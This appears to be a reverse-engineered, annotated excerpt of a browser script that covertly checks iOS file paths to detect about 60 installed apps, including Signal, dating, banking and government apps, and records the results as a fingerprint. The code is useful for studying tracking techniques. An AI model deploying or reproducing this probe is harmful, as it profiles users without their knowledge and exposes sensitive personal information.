// s97 — sig_s97_dataTransfer
// module cm, stage2, codes 0 -1 -2 -3
//
// measures
//   window.DataTransfer window.File window.RegExp document.createElement()
//   document.removeEventListener("visibilitychange") document.addEventListener("visibilitychange")
//   document.hidden TextEncoder clearTimeout() setTimeout()
// engine
//   Promise.all() ArrayBuffer Object.getOwnPropertyNames() Object.getPrototypeOf() Promise.race()
//   Uint32Array Uint8Array Promise
// reported value
//   call null
// probes
//   "/1" "96375" "TypeError" "br.gov.meugovbr" "co.visualsupply.cam" "com.airbnb.app"
//   "com.alipay.iphoneclient" "com.apple.MobileSMS" "com.apple.Preferences"
//   "com.apple.ScreenshotServicesService" "com.apple.mediaanalysisd" "com.apple.mobilephone"
//   "com.atebits.Tweetie2" "com.badoo.Badoo" "com.burbn.barcelona" "com.burbn.instagram"
//   "com.canva.canvaeditor" "com.cardify.tinder" "com.einnovation.temu" "com.facebook.Facebook"
//   "com.facebook.Messenger" "com.google.Drive" "com.google.Gmail" "com.google.GoogleMobile"
//   "com.google.Maps.WatchKitApp" "com.google.Translate" "com.google.chrome.ios"
//   "com.google.ios.youtube" "com.google.photos" "com.grabtaxi.iphone" "com.grubhub.search"
//   "com.hammerandchisel.discord" "com.iwilab.KakaoTalk" "com.lemon.lvoverseas"
//   "com.linkedin.LinkedIn" "com.microsoft.skype.teams" "com.moxco.bumble" "com.openai.chat"
//   "com.reddit.Reddit" "com.revolut.revolut" "com.ss.iphone.ugc.Ame" "com.ss.iphone.ugc.Aweme"
//   "com.strava.stravaride" "com.tencent.xin" "com.tenten.app" "com.tinyspeck.chatlyio"
//   "com.toyopagroup.picaboo" "com.ubercab.UberEats" "com.viber" "com.vk.vkclient"
//   "com.woltapp.wolt" "com.zhiliaoapp.musically" "doordash.DoorDashConsumer" "ee.mtakso.client"
//   "jp.naver.line" "net.whatsapp.WhatsApp" "net.whatsapp.WhatsAppSMB" "org.whispersystems.signal"
//   "ph.telegra.Telegraph" "pinterest" "ru.yandex.ytaxi" "tv.twitch"
// compares against
//   !== 0 === "TypeError" in "DataTransfer"
// decides on
//   h_s97_fn2()
//   fn99()
//   fn142: !((v957 = arg822.cancel) == null)
//   fn99: !("DataTransfer" in window)
//   fn99: v756 instanceof Error && v756.name === "TypeError"
//   visibilitychange: !(v869 || v868)
//   visibilitychange: !v869 && v868
//   h_s97_fn: v598 !== 0
//
// 3 owned helpers inlined below.
// shared with other collectors, see agent.clean.js:
//   asUint8Array:6496 crc32OfBytes:4943 fn103:5670 fn142:7227 fn158:8266 fn48:3370 fn66:3854
//   fn99:5449 resolveNameByHash:7015 stringToBytes:7901 visibilitychange:6423

// agent.clean.js:1562
async function sig_s97_dataTransfer() {
  return await fn142(fn66(500, { s: -2, v: null }), async () => {
    if (h_s97_fn2()) {
      if (fn99()) {
        return { s: 0, v: await h_s97_fn3() };
      }
      return { s: -1, v: null };
    }
    return { s: -3, v: null };
  });
}

// agent.clean.js:4130
function h_s97_fn(arg515) {
  return new Promise((arg516) => {
    const v597 = "/private/var/mobile/Media/PhotoData/external/" + arg515 + "/1";
    try {
      const [, v598, v599] = fn103(v597);
      if (v598 !== 0) {
        return void arg516(v598);
      }
      v599.getParent(
        () => arg516(0),
        () => arg516(-1),
      );
    } catch (v600) {
      arg516(-2);
    }
  });
}

// agent.clean.js:6655
function h_s97_fn2() {
  return [
    "br.gov.meugovbr",
    "co.visualsupply.cam",
    "com.airbnb.app",
    "com.alipay.iphoneclient",
    "com.apple.MobileSMS",
    "com.apple.Preferences",
    "com.apple.ScreenshotServicesService",
    "com.apple.mediaanalysisd",
    "com.apple.mobilephone",
    "com.atebits.Tweetie2",
    "com.badoo.Badoo",
    "com.burbn.barcelona",
    "com.burbn.instagram",
    "com.canva.canvaeditor",
    "com.cardify.tinder",
    "com.einnovation.temu",
    "com.facebook.Facebook",
    "com.facebook.Messenger",
    "com.google.Drive",
    "com.google.Gmail",
    "com.google.GoogleMobile",
    "com.google.Maps.WatchKitApp",
    "com.google.Translate",
    "com.google.chrome.ios",
    "com.google.ios.youtube",
    "com.google.photos",
    "com.grabtaxi.iphone",
    "com.grubhub.search",
    "com.hammerandchisel.discord",
    "com.iwilab.KakaoTalk",
    "com.lemon.lvoverseas",
    "com.linkedin.LinkedIn",
    "com.microsoft.skype.teams",
    "com.moxco.bumble",
    "com.openai.chat",
    "com.reddit.Reddit",
    "com.revolut.revolut",
    "com.ss.iphone.ugc.Ame",
    "com.ss.iphone.ugc.Aweme",
    "com.strava.stravaride",
    "com.tencent.xin",
    "com.tenten.app",
    "com.tinyspeck.chatlyio",
    "com.toyopagroup.picaboo",
    "com.ubercab.UberEats",
    "com.viber",
    "com.vk.vkclient",
    "com.woltapp.wolt",
    "com.zhiliaoapp.musically",
    "doordash.DoorDashConsumer",
    "ee.mtakso.client",
    "jp.naver.line",
    "net.whatsapp.WhatsApp",
    "net.whatsapp.WhatsAppSMB",
    "org.whispersystems.signal",
    "ph.telegra.Telegraph",
    "pinterest",
    "ru.yandex.ytaxi",
    "tv.twitch",
  ];
}

// agent.clean.js:8753
async function h_s97_fn3() {
  const v1094 = h_s97_fn2(),
    v1095 = await Promise.all(v1094.map(h_s97_fn)),
    v1096 = {};
  v1094.forEach((arg964, arg965) => {
    const v1097 = fn48(arg964).toString(16);
    v1096[v1097] = v1095[arg965];
  });
  return v1096;
}
